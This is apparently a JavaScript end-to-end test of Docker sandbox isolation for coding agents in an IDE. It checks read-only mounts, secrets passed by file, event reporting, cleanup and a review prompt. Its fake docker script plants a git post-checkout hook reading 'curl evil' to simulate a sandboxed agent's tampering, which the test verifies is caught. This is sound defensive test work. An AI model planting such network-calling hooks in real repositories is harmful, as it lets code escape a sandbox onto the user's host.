// Docker sandboxes against a stand-in `docker`: what the container gets (only the project, host-run
// config read-only, picked secrets in a private file, never in arguments), Mission Control events from
// inside it, cleanup when stopped, and the review before the next host terminal.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { launch, SB } from './harness.mjs';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const KEY = 'sk-ant-api03-SANDBOXKEY0123456789abcdefgh';

// `docker`: info/inspect answer like a running daemon with the image; `run` records its arguments,
// reads the secrets file it was given, reports a Mission Control event the way the in-container hook
// would (a line in the mounted events file), plants a git hook in the project, then waits.
const fakeDocker = (log) => `#!/usr/bin/python3
import base64, json, os, re, sys
args = sys.argv[1:]
if args[:1] == ['info']: print('27.1.1'); sys.exit(0)
if args[:2] == ['image', 'inspect']: print('sha256:abc'); sys.exit(0)
with open(${JSON.stringify(log)}, 'a') as f: f.write(json.dumps(args) + '\\n')
if args[:1] == ['rm']: sys.exit(0)
mounts = [a for a in args if a.startswith('type=bind,')]
env_file = next(m for m in mounts if 'target=/run/meridian/env' in m).split('source=')[1].split(',')[0]
env = dict(l.split('=', 1) for l in open(env_file).read().split())
names = sorted(env)
print('SANDBOX READY ' + ','.join(names), flush=True)
mission = [m for m in mounts if 'target=/meridian' in m]
if mission:
    d = mission[0].split('source=')[1].split(',')[0]
    token = base64.b64decode(env['MERIDIAN_MISSION_TOKEN']).decode()
    with open(os.path.join(d, 'events.jsonl'), 'a') as f:
        f.write(json.dumps({'v': 1, 'token': token, 'kind': 'claude', 'event': 'SessionStart', 'model': 'sandboxed-model'}) + '\\n')
project = next(m for m in mounts if m.endswith('target=/workspace')).split('source=')[1].split(',')[0]
os.makedirs(os.path.join(project, 'sub', '.git', 'hooks'), exist_ok=True)
open(os.path.join(project, 'sub', '.git', 'hooks', 'post-checkout'), 'w').write('curl evil')
sys.stdin.readline()
`;

test('Sandbox: isolation, secrets file, Mission Control from inside, cleanup, host review', async () => {
  const project = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'meridian-sbx-')));
  fs.mkdirSync(path.join(project, '.git'));
  const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'meridian-e2e-bin-'));
  const log = path.join(bin, 'docker.log');
  fs.writeFileSync(path.join(bin, 'docker'), fakeDocker(log), { mode: 0o755 });
  const b = await launch(['about:blank'], { args: [`--meridian-test-project=${project}`, `--meridian-agents-path=${bin}`, '--meridian-no-notify', '--meridian-test-dialog-answer=Cancel'] });
  let wb;
  const termText = `S.activeTerm?.xterm.buffer.active ? Array.from({ length: S.activeTerm.xterm.buffer.active.length }, (_, i) => S.activeTerm.xterm.buffer.active.getLine(i)?.translateToString(true) || '').join('') : ''`;
  try {
    await b.waitFor(`${SB}.querySelectorAll('meridian-tab-row').length === 1`);
    await b.eval('app.$.tabstrip.runCommand(16, 0)');
    wb = await b.page('chrome://workbench');
    await wb.waitFor(`!document.querySelector('#welcome').hidden`, 15000);
    await wb.eval(`document.querySelector('#open-folder').click()`);
    await wb.waitFor('!!S.project');
    const status = await wb.eval('window.workbench.sandboxStatus(true)');
    assert.equal(status.running, true);
    assert.equal(status.imagePresent, true);
    assert.match(status.image, /^meridian-sandbox:[0-9a-f]{12}$/);
    await wb.eval(`window.workbench.vaultSet({ name: 'ANTHROPIC_API_KEY', value: ${JSON.stringify(KEY)}, scope: 'global' })`);
    await wb.eval(`window.workbench.vaultSet({ name: 'UNRELATED_TOKEN', value: 'not-for-sandboxes-123', scope: 'global' })`);

    // A sandboxed Claude Code: only what it needs to sign in goes in.
    const info = await wb.eval(`window.workbench.ptyCreate({ kind: 'sandbox-claude', cols: 80, rows: 24 })`);
    assert.equal(info.sandbox, true);
    assert.deepEqual(info.secrets, ['ANTHROPIC_API_KEY']);
    assert.ok(info.notes.some((n) => /only this project is mounted/.test(n)));
    for (let i = 0; i < 50 && !fs.existsSync(log); i++) await sleep(200);
    const args = JSON.parse(fs.readFileSync(log, 'utf8').split('\n')[0]);
    const joined = args.join(' ');
    assert.equal(args[0], 'run');
    assert.ok(joined.includes(`type=bind,source=${project},target=/workspace `));
    assert.ok(joined.includes(`source=${project}/.git,target=/workspace/.git,readonly`));
    assert.ok(joined.includes('/workspace/.mcp.json,readonly'), 'missing host-run config gets a read-only placeholder');
    assert.ok(joined.includes('--cap-drop ALL') && joined.includes('--security-opt no-new-privileges'));
    assert.ok(!joined.includes(KEY), 'the key never appears in docker arguments');
    assert.ok(fs.existsSync(path.join(project, '.mcp.json')));

    // Mission Control hears the session from inside the container.
    let node;
    for (let i = 0; i < 50 && !node; i++) {
      const snap = JSON.parse((await b.eval('app.$.tabstrip.handler_.getMissionState()')).snapshotJson);
      node = snap.nodes.find((n) => n.where === 'sandbox' && n.sublabel === 'sandboxed-model');
      if (!node) await sleep(200);
    }
    assert.ok(node, 'the sandbox event reached Mission Control');
    assert.equal(node.label, 'Claude Code');

    // Stopping it removes the container and the placeholders.
    await wb.eval(`window.workbench.ptyKill(${JSON.stringify(info.id)})`);
    for (let i = 0; i < 50 && !fs.readFileSync(log, 'utf8').includes('"rm"'); i++) await sleep(200);
    assert.ok(fs.readFileSync(log, 'utf8').includes(`["rm", "-f", "${args[args.indexOf('--name') + 1]}"]`));
    for (let i = 0; i < 50 && fs.existsSync(path.join(project, '.mcp.json')); i++) await sleep(100);
    assert.equal(fs.existsSync(path.join(project, '.mcp.json')), false);

    // The sandbox planted a git hook: a host terminal asks first (Cancel here).
    const refused = await wb.eval(`window.workbench.ptyCreate({ kind: 'shell' }).then(() => 'started', (e) => e.message)`);
    assert.match(refused, /review what the sandboxed agent changed/);
  } finally {
    wb?.close();
    await b.close();
    for (const d of [project, bin]) fs.rmSync(d, { recursive: true, force: true });
  }
});
